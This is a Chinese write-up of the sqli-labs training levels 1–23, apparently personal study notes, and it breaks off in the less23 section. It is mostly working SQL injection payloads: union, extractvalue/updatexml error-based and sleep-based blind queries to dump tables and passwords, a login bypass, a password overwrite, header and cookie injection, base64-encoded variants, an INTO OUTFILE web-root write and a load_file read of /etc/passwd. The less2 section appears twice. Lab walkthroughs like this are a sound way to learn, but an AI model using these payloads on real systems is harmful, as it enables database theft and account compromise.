# SQL-labs wp（得到报错位-union、无法得到报错位-extractvalue、无法得到报错内容-布尔盲注和时间盲注、post提交、post-修改密码、http头注入、referer、cookie、cookie-base64、注释符过滤、密码重置、and和or、空格过滤、unionselect过滤、unionselect单引号括号过滤、宽字节注入、post宽字节注入、堆叠注入）



# less1

![image-20220114230513536](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114230513536.png)

让我们提交id参数：

![image-20220114230559532](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114230559532.png)

可注入。



基本步骤：

推断数据库语法大概是什么，让他报错，显示自己的闭合方式:

```
?id=1\
```

![image-20220114231804679](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114231804679.png)

得到闭合方式为`'`



确定列数：

```
?id=2' order by 3 --+
```

![image-20220114232558568](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114232558568.png)

![image-20220114232710941](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114232710941.png)



**使用联合查询，查询其报错位置**：

```
?id=-2' union select 1,2,3 --+
```

![image-20220114232916780](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114232916780-16421741580961.png)



然后就可以进行操作注入爆破它的数据库：

```
?id=-2' union select 1,database(),3 --+
```

得到数据库名：security

![image-20220114233036834](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114233036834.png)



继续利用`information_schema`得到它的表名：

```
?id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+`
```

![image-20220114233718152](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114233718152.png)

得到表名：emails,referers,uagents,users



继续查询表中的列：

```
?id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

发现:id,username,password

![image-20220114233943230](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114233943230.png)



继续查询列中的内容：

```
?id=-2' union select 1,group_concat(username),group_concat(password) from users --+
```

![image-20220114234401609](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114234401609.png)

得到：

```
Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4

Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```




# less2

![image-20220115083605312](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115083605312.png)



判断闭合方式：

```
?id=2'

?id=2 order by 3
```

![image-20220115083920475](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115083920475.png)

没有闭合



按照步骤做：

![image-20220115084126101](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084126101.png)

![image-20220115084147196](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084147196.png)

数据库名：security



![image-20220115084412786](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084412786.png)

得到表名：emails,referers,uagents,users



![image-20220115084710094](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084710094.png)

得到列名：id,username,password



![image-20220115084820188](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084820188.png)

Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4

Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4




# less2

![image-20220115083605312](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115083605312.png)



判断闭合方式：

```
?id=2'

?id=2 order by 3
```

![image-20220115083920475](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115083920475.png)

没有闭合



按照步骤做：

![image-20220115084126101](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084126101.png)

![image-20220115084147196](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084147196.png)

数据库名：security



![image-20220115084412786](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084412786.png)

得到表名：emails,referers,uagents,users



![image-20220115084710094](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084710094.png)

得到列名：id,username,password



![image-20220115084820188](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115084820188.png)

Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4

Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4





# less4

![image-20220115085703985](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115085703985-16422082249831.png)



![image-20220115085740812](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115085740812.png)



![image-20220115085822919](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115085822919.png)



![image-20220115085924702](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115085924702.png)



![image-20220115090006857](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115090006857.png)



![image-20220115090048061](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115090048061.png)





# less5

![image-20220115090115576](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115090115576.png)



![image-20220115090335275](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115090335275.png)

闭合方式：`'`



![image-20220115090505384](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115090505384.png)

得到有3列



经过标准流程但是**无法得到输出的报错位**：

![image-20220115090649639](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115090649639.png)



那么思考：

关于报错注入：如果输入错误就会报错，如果输入正确会查数据库，但不显示东西——使用报错注入



方法1：使用rand()的漏洞

```
?id=1' AND (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b) --+
```

![image-20220115091145526](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115091145526.png)



```
id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
```

```
?id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
```



方法2：简单高效

利用extractvalue漏洞、updatexml函数

报错注入

```
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+

' and updatexml('1',concat('~',(select database())),'1')#
```



![image-20220115091917832](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115091917832.png)



![image-20220115092210082](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115092210082.png)

```
?id=1' AND extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="security"),0x7e)) --+
```



![image-20220115092329490](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115092329490.png)

```
?id=1' AND extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),0x7e)) --+
```



![image-20220115092451900](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115092451900.png)

```
?id=1' AND extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e)) --+
```



```sql
# substr(password,10)表示从第10位开始截取后面的内容
' and updatexml('1',concat('~',(
select substr(group_concat(password),10) from admin limit 0,1
)),'1')#
```




# less6

![image-20220115092752014](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115092752014.png)



![image-20220115092817084](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115092817084.png)

闭合方式：`"`



无法得到输出的报错位结果:

![image-20220115092915205](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115092915205.png)



使用报错注入：

![image-20220115093324299](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115093324299.png)



![image-20220115093521576](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115093521576.png)



![image-20220115093609243](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115093609243.png)



![image-20220115102618683](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115102618683.png)



![image-20220115102716033](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115102716033.png)

长度不够用：**substr**

```
?id=1" AND extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x7e,password) ,10)from users),0x7e)) --+
```



# less7

【本地环境尝试】

![image-20220115102815887](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115102815887.png)



![image-20220115102841516](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115102841516.png)

提示我们用outfile



尝试去找它的闭合方式：

`"`、`")`、`"))`



**关于写入文件：**

**Apache网站位置**：

/var/www/html/

旧版本：

/var/www/

**PHPstudy目录**：

c:/phpstudy_pro/WWW/Less-7/



后方生成的文件名每一次不能一样，否则无法访问

```
id=-2')) union select 1,database(),3 into outfile "/var/www/html/Less-7/zj1.txt"

id=-2')) union select 1,database(),3 into outfile "c:/phpstudy_pro/WWW/Less-7/zj1.txt"
```

然后直接访问本地文件可得





# less8

![image-20220115103801980](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115103801980.png)



尝试多次后发现**无法得到闭合方式和报错位置、报错内容**

——盲注



尝试：

```
?id=1    正常
?id=200000    不正常
?id=1\     不正常
?id=haha   不正常
```

因此可以估计：该数据库需要往里面传入一些不大不小的数字

```
?id=1' --+   正常
?id=1' and 0 --+    不正常
?id=1' and 1 --+   正常
```

得到结论：单引号闭合，且可以注入

```
?id=1' and 1<2 --+   正常
```

可以推出：可以输入一些长语句

![image-20220115110412431](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115110412431.png)

![image-20220115110427809](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115110427809.png)



那么可以使用ascii码来判断字符

```
?id=1' and (select ascii(substr(database(),1,1))<115) --+

?id=1' and (select ascii(substr(database(),1,1))=115) --+
```

![image-20220115112657201](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115112657201.png)

得到第一位：s



......

接着正常步骤得库名等......





# less9

界面上完全没有反应，但是你好像觉得可以注入

依靠网站左上角是否转圈加载来判断是否可以实现注入



判断闭合方式

```
?id=1' and sleep(5)--+
```

![image-20220115115431625](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115115431625.png)



```
?id=1' and if((select database())="security",sleep(5),null) 
```



```
id=2' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(5),null)--+
```



...继续正常步骤





# less10

![image-20220115125358643](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115125358643.png)

得到闭合方式为`"`



![image-20220115125548576](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115125548576.png)

得到数据库第一个字符为s



...继续后续





# less11

![image-20220115125706479](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115125706479.png)

post提交



尝试提交：

![image-20220115125813116](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115125813116.png)



`\`判断闭合方式



万能密码

```
' or 1=1 #
```

可以进入

![image-20220115130043873](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115130043873.png)



那么可以尝试：

```
' order by 2#
```

![image-20220115130536164](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115130536164.png)

得到有两列



那么就可以按正常流程：

```
' union select 1,2 #
```

![image-20220115130718085](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115130718085.png)



```
' union select database(),2 #
```

![image-20220115130815210](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115130815210.png)



```
' union select group_concat(table_name),2 from information_schema.tables where table_schema="security" #
```

![image-20220115130930869](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115130930869.png)



```
' union select group_concat(column_name),2 from information_schema.columns where table_schema="security" and table_name="users" #
```

![image-20220115131025305](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115131025305.png)



``` 
' union select group_concat(username),group_concat(password) from users # 
```

![image-20220115131226014](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115131226014.png)






# less12

```
\
```

![image-20220115133356532](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115133356532.png)

得到闭合方式`")`



```
") order by 2#
```

![image-20220115133523865](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115133523865.png)



```
") union select 1,2#
```

![image-20220115133615372](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115133615372.png)



```
") union select database(),2#
```

![image-20220115133709608](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115133709608.png)



```
") union select group_concat(table_name),2 from information_schema.tables where table_schema="security"#
```

![image-20220115133947750](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115133947750.png)



```
") union select group_concat(column_name),2 from information_schema.columns where table_schema="security" and table_name="users"#
```

![image-20220115134029215](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115134029215.png)



```
") union select group_concat(username),group_concat(password) from users #
```

![image-20220115134324515](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115134324515.png)







# less13

`\`

![image-20220115134435057](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115134435057.png)

得到闭合方式为`')`



![image-20220115134931917](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115134931917.png)

可以登录

因此可以注入



但是

```
') order by 2#

') union select 1,2#
```

无法得到报错位



那么就可以利用报错注入：

```
') and updatexml('1',concat('~',(select database())),'1')#
```

```
') and updatexml('1',concat('~',(select group_concat(table_name) from information_schema.tables where table_schema="security")),'1')#
```

![image-20220115140133997](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115140133997.png)

![image-20220115140219835](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115140219835.png)

```
') and updatexml('1',concat('~',(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),'~'),'1')#
```

![image-20220115140450620](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115140450620.png)

```
') and updatexml('1',concat(0x3e,(select group_concat(username,0x7e,password) from users),0x3e),'1') #
```

得到：

![image-20220115141236143](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115141236143.png)

```
') and updatexml('1',concat(0x3e,(select substr(group_concat(username,0x7e,password),30) from users),0x3e),'1') #
```

![image-20220115141519591](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115141519591.png)

```
') and updatexml('1',concat(0x3e,(select substr(group_concat(username,0x7e,password),52) from users),0x3e),'1') #
```

![image-20220115141659421](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115141659421.png)

......





# less14

`\`

得到`"`闭合



````
" or 1=2 #
" order by 1#
````

不显示报错位——报错注入：



```
" and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
```

![image-20220115142226534](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115142226534.png)

```
" AND extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="security"),0x7e)) #
```

![image-20220115142456224](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115142456224.png)

```
" AND extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),0x7e)) #
```

![image-20220115142551392](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115142551392.png)

```
" AND extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x7e,password),1) from users),0x7e)) #
```

![image-20220115142707974](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115142707974.png)

......






# less15

`\`

不显示结果



但是尝试报错注入也不显示报错内容

——尝试盲注



判断闭合方式

```
' or 1=1 #
```

用户名和密码都写：

```
' or ('1')=('1
```

实际上是：

```
select username,password from table1 where username='' or '1'='1' and password='' or '1'='1' limit 0,1;
```



或：

```
' or sleep(5) #
' and sleep(5) #
```

也可以穷举：

```
admin' and sleep(5) #
```

也可以猜：

```
admin' and (select database()='security') #

admin' and if(ascii(substr(database(),1,1))=115,sleep(10),null) #
```

```
' or if(ascii(substr(database(),1,1))=115,sleep(10),null) #
```





布尔型盲注最好先猜出他们网站有什么用户名，以一个正确的用户名来当参照
admin") and (select database()='security') #







# less16

`\`

不显示结果



但是尝试报错注入也不显示报错内容

——尝试盲注



判断闭合方式

```
”) or 1=1 #
```

用户名和密码都写：

```
") or ("1")=("1
```

实际上是：

```
select username,password from table1 where username=("") or ("1")=("1") and password=("") or ("1")=("1") limit 0,1;
```



或：

```
") or sleep(5) #
") and sleep(5) #
```

也可以穷举：

```
admin") and sleep(5) #
```

也可以猜：

```
admin") and (select database()='security') #

admin") and if(ascii(substr(database(),1,1))=115,sleep(10),null) #
```

```
") or if(ascii(substr(database(),1,1))=115,sleep(10),null) #
```





布尔型盲注最好先猜出他们网站有什么用户名，以一个正确的用户名来当参照
admin") and (select database()='security') #






# less17

![image-20220114222534038](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less17-post-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81.assets/image-20220114222534038.png)



**sql语法里的“改”**:

```
update users set password='$pass' where username='Dumb';
```

推测闭合方式——使用万能密码——把密码改为空或者1

```
' or 1=1 #
```



```
update users set password='' or 1=1 # where username='Dumb';

update users set password=1 
```



![image-20220115170248765](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less17-post-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81.assets/image-20220115170248765.png)





# less18

![image-20220115170422475](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less18.assets/image-20220115170422475.png)



发现显示了自己的IP地址

尝试提交查看网站基本状况：admin

![image-20220115172436483](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less18-http%E5%A4%B4%E6%B3%A8%E5%85%A5.assets/image-20220115172436483.png)

得到自己查看网页的浏览器信息。——user-agent——http头注入

使用burpsuite



那么我们可以修改我们user-agent的提交信息：

![image-20220115174014584](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less18-http%E5%A4%B4%E6%B3%A8%E5%85%A5.assets/image-20220115174014584.pngg)

![image-20220115174057494](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less18-http%E5%A4%B4%E6%B3%A8%E5%85%A5.assets/image-20220115174057494.png)



猜测它的语句可能为：

```
insert into 'security'.'uagents'('uagent','ip_address','username') values('\','127.0.0.1','admin');
```

即单引号闭合。



那么我们就可以根据原语句把它的单引号闭合，并让它**能正确执行语句**——那么考虑使用万能密码和报错注入：

```
' or '1'='1
```

或者用and也可

```
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1

' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1
```

![image-20220115175923133](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less18-http%E5%A4%B4%E6%B3%A8%E5%85%A5.assets/image-20220115175923133.png)

```
' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="security"),0x7e)) or '1'='1

因为其实value提交的值是空的，也就是错误，用and 需要都是对的才行
1' a extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="security"),0x7e)) or '1'='1
```

```
' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),0x7e)) or '1'='1
```

![image-20220115184420602](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less18-http%E5%A4%B4%E6%B3%A8%E5%85%A5.assets/image-20220115184420602.png)





# less19

![image-20220115182748991](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less19.assets/image-20220115182748991.png)



使用burpsuite



测试一下：

`\`

![image-20220115183224235](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less19-referer.assets/image-20220115183224235.pngg)

闭合方式为`'`



```
1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1
```

```
' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="security"),0x7e)) or '1'='1

' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),0x7e)) or '1'='1

' or extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x7e,password),1) from users),0x7e)) or '1'='1

```

![image-20220115185443632](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less19-referer.assets/image-20220115185443632.pngg)

![image-20220115185525444](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less19-referer.assets/image-20220115185525444.png)

![image-20220115185709125](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less19-referer.assets/image-20220115185709125.png)

![image-20220115185730615](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less19-referer.assets/image-20220115185730615.png)

......




# less20

![image-20220115190042951](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less20-.assets/image-20220115190042951.png)

![image-20220115190027521](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less20-.assets/image-20220115190027521.png)

发现cookie注入

刷新，

还是用`\`测试：

![image-20220114225455740](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less20-cookie.assets/image-20220114225455740.png)

得知单引号闭合。

![image-20220115192012223](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less20-cookie.assets/image-20220115192012223.png)

注意cookie后面有`;`，因此我们操作需要在分号前操作。



```
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #

admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
```

![image-20220115192035724](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less20-cookie.assets/image-20220115192035724.png)



```
' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="security"),0x7e)) #

' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),0x7e)) #

' and extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x7e,password),1) from users),0x7e)) #
```

![image-20220115192147089](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less20-cookie.assets/image-20220115192147089.png)

......

注意注入位置：

![image-20220115192216509](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less20-cookie.assets/image-20220115192216509.png)






# less21

sql注入读写文件

1、注入点和Less-20的相同，请参考Less-20的分析，也可以采用Less-20的方法注入。
但是这一关想考查的是利用sql注入读写文件。
Less-20: https://blog.csdn.net/bigblue00/article/details/108996908

2、sql注入读写文件的理论分析请参考Less-7。注入的语句也相同，只是两关一个是GET方法一个是POST方法。
Less-7: https://blog.csdn.net/bigblue00/article/details/106765249

注入点的**闭合方式**是 ') 即单引号加小括号，注入点的数据用 Base64进行了编码，所以注入语句也要用base64进行编码。
例如：读取 /etc/passwd 文件采用的语句如下：
`') union select 1,load_file("/etc/passwd"),3#`
进行base64编码后：
`JykgdW5pb24gc2VsZWN0IDEsbG9hZF9maWxlKCIvZXRjL3Bhc3N3ZCIpLDMj`
在这里插入图片描述

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less21-cookie.assets/watermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JpZ2JsdWUwMA%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center.png)



## POST- Dump into outfile - String

http://10.10.202.112/sqli/Less-21/index.php

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less21-cookie.assets/1603917-20190620171629363-46772792.png)



YWRtaW4%3D

YWRtaW4=

base64 解码为：admin

admin' -- YWRtaW4n

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less21-cookie.assets/1603917-20190620172333860-2024933218.png)

 

尝试闭合：

admin' and 's'='s -- YWRtaW4nIGFuZCAncyc9J3M=

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less21-cookie.assets/1603917-20190620172455226-1282197282.png)

payload:

`admin' and updatexml(null,concat(0x0a,(select version())),null) and 's'='s `

`YWRtaW4nIGFuZCB1cGRhdGV4bWwobnVsbCxjb25jYXQoMHgwYSwoc2VsZWN0IHZlcnNpb24oKSkpLG51bGwpIGFuZCAncyc9J3M=`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less21-cookie.assets/1603917-20190620172752638-1546351725.png)








# Less-22

Future Editions

http://10.10.202.112/sqli/Less-22/index.php

首先登陆：

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less22.assets/1603917-20190620173447393-1346421892.png)

base64 解码

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less22.assets/1603917-20190620173726595-1753054092.png)

尝试报错注入下：

admin" -- YWRtaW4i

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less22.assets/1603917-20190620173835130-1845019556.png)

尝试闭合：

admin" and "s"="s -- YWRtaW4iIGFuZCAicyI9InM=

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less22.assets/1603917-20190620174029515-1526646324.png)

构造SQL

`admin" and updatexml(1,concat(0x7e,database(),0x7e),1) and "s"="s`

`YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCAicyI9InM=`

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less22.assets/1603917-20190620174338906-391415002.png)

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less22.assets/1603917-20190620174318764-676183813.png)

 
 
 
 
 
 # less23

![image-20220115193637902](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-有过滤.assets/image-20220115193637902.png)

![image-20220115193648217](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-有过滤.assets/image-20220115193648217-164224660951213.png)



`?id=\`

![image-20220115193957337](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-有过滤.assets/image-20220115193957337.png)

发现`'`闭合

```
?id=1' order by 3 -+
```

![image-20220115194050155](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/less23-有过滤.assets/image-20220115194050155.png)

发现注释符被过滤



那么如果不用注释符，那就需要根据它可能的语句，思考如何让它成功执行sql语句且绕过注释符：

根据上图，可以看到提交的内容`[input]`最后形成`'[input]'limit 0,1`

